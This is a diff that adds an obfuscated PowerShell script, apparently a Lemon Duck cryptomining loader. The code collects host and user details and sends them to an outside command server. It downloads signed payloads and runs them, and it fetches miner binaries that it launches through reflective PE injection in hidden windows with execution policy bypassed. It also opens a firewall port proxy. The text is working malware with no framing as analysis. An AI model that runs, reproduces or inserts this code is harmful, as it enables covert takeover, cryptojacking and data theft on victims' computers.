@@ -1,0 +1,100 @@
+ inVOKe-exPrEssIon( (('(('$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+$code1='try{$localIf=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalIf'"+',[ref]$localIf)}catch{}'
+$code2='try{$localMn=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalMn'"+',[ref]$localMn)}catch{}'
+$code3='try{$localMna=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalMna'"+',[ref]$localMna)}catch{}'
+IEX $code2
+IEX $code1
+$comp_name = $env:COMPUTERNAME
+$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
+$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
+$os = (Get-WmiObject -class Win32_OperatingSystem).Version
+$bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split "-")[0]
+$user = $env:USERNAME
+$domain = (Get-WmiObject win32_computersystem).Domain
+$uptime = [timespan]::FromMilliseconds([environment]::TickCount)|foreach{$_.totalseconds}
+$card = ([string](Wmic Path Win32_VideoController Get Description)).trim("Description").trim()
+$if_ = Test-Path $env:tmp\if.bin
+$mf_ = (Test-Path $env:tmp\m3.bin) -or (Test-Path $env:tmp\m6.bin)
+try{
+$drive = ([system.IO.DriveInfo]::GetDrives() | where {$_.IsReady -and ($_.AvailableFreeSpace -gt 1024) -and (($_.DriveType -eq "Removable") -or ($_.DriveType -eq "Network")) -and (($_.DriveFormat -eq "NTFS") -or ($_.DriveFormat -eq "FAT32"))} | foreach{($_.Name)[0]+"_"+($_.DriveType.tostring())[0]})-join"|"}catch{}
+$timestamp = Get-Date -UFormat "%s"
+if((new-object system.net.webclient).downloadstring('http://127.0.0.1:43669/1/summary') -match '"total": \[\n(.+)\n(.+)\n(.+)\n'){$hr=$matches[1].trim()+$matches[2].trim()+$matches[3].trim()}
+$isA = ($card -match "Radeon") -and ([IntPtr]::Size -eq 8)
+
+$params = "ID="+$comp_name+"&GUID="+$guid+"&MAC="+$mac+"&OS="+$os+"&BIT="+$bit+"&USER="+$user+"&DOMAIN="+$domain+"&D="+$drive+"&CD="+$card+"&P="+[Int]$permit+"&FI="+[Int]!$localIf+"&FM="+[Int]!$localMn+"&IF="+[Int]$if_+"&MF="+[Int]$mf_+"&HR="+$hr+"&UP="+$uptime+"&_T="+$timestamp
+
+if($isA){
+IEX $code3
+if((new-object system.net.webclient).downloadstring('http://127.0.0.1:43668/1/summary') -match '"total": \[\n(.+)\n(.+)\n(.+)\n'){
+$hra=$matches[1].trim()+$matches[2].trim()+$matches[3].trim()
+$params+="&HRA="+$hra
+}
+
+}
+
+$core_url = "http://t.zer2.com/report.jsp"
+$down_url = "http://down.ackng.com"
+
+function SIEX {  
+Param(
+[string]$url
+)
+try{
+$webclient = New-Object System.Net.WebClient
+           $finalurl = "$url"+"?"+"$params"
+try{
+  $webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
+} catch{}
+$res_bytes = $webclient.DownloadData($finalurl)
+if($res_bytes.count -gt 173){
+            $sign_bytes = $res_bytes[0..171];
+$raw_bytes = $res_bytes[173..$res_bytes.count];
+                       $rsaParams = New-Object System.Security.Cryptography.RSAParameters
+$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
+                  $rsaParams.Exponent = 0x01,0x00,0x01
+$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
+$rsa.ImportParameters($rsaParams)
+$base64 = -join([char[]]$sign_bytes)
+$byteArray = [convert]::FromBase64String($base64)
+$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
+if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {
+IEX (-join[char[]]$raw_bytes)
+}
+}
+       } catch{}
+}
+
+try{
+if($localIf){
+$ifmd5="abcc20b2de0b18c895b94d2c23c0bc63"
+$arg = "/c powershell -nop -w hidden -ep bypass -c " + '"'+'$ifp=$env:tmp+''\if.bin'';if(test-path $ifp){$con=[System.IO.File]::ReadAllBytes($ifp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''X2'')};if($s-ne'+"'$ifmd5'"+'){$con=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/if.bin?" + $params + ''');[System.IO.File]::WriteAllBytes($ifp,$con)}IEX(-join[char[]]$con)"'
+Start-Process -FilePath cmd.exe -ArgumentList "$arg"
+'+}
+}catch{}
+
+try{
+if($localMn){
+if([IntPtr]::Size -eq 8){
+$mbin = "m6.bin"
+$mmd5 = "a48ea878f703c32ddac33abc6fad70d3"
+}else{
+$mbin = "m3.bin"
+$mmd5 = "9e72de890eeb784a875ef57b85b3ee1d"
+}
+$arg = "/c powershell -nop -w hidden -ep bypass -c "+'"'+$code2+';$mp=$env:tmp+'+"'\$mbin';"+'if(test-path $mp){$con=[System.IO.File]::ReadAllBytes($mp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''X2'')};if($s-ne'+"'$mmd5'"+'){$con=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/${mbin}?" + $params + ''');[System.IO.File]::WriteAllBytes($mp,$con)};for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $con[($i+1)..($con.count)]"'
+Start-Process -FilePath cmd.exe -ArgumentList "$arg"
+}
+if($isA -and $localMna){
+$mmd5 = "e2ed6568626e696de58f13b2aa26243d"
+$arg = "/c powershell -nop -w hidden -ep bypass -c "+'"'+$code3+';$mp=$env:tmp+'+"'\m6a.bin';"+'if(test-path $mp){$con=[System.IO.File]::ReadAllBytes($mp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''X2'')};if($s-ne'+"'$mmd5'"+'){$con=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/m6a.bin?" + $params + ''');[System.IO.File]::WriteAllBytes($mp,$con)};for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $con[($i+1)..($con.count)]"'
+Start-Process -FilePath cmd.exe -ArgumentList "$arg"
+}
+}catch{}
+
+SIEX $core_url
+
+cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNS
+netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
+')-cREPLace '"',[ChAR]34  -rEpLAcE ([ChAR]117+[ChAR]105+[ChAR]56),[ChAR]36 -rEpLAcE  ([ChAR]115+[ChAR]110+[ChAR]81),[ChAR]124 -cREPLace '\',[ChAR]92  -rEpLAcE  ''',[ChAR]39)|. ( $veRbOSeprEferEncE.TostRING()[1,3]+'X'-JoiN'')
+
+')-cRePlace([Char]66+[Char]98+[Char]101),[Char]124 -cRePlace([Char]66+[Char]80+[Char]86),[Char]36-rEPlACE([Char]86+[Char]116+[Char]105),[Char]39) )
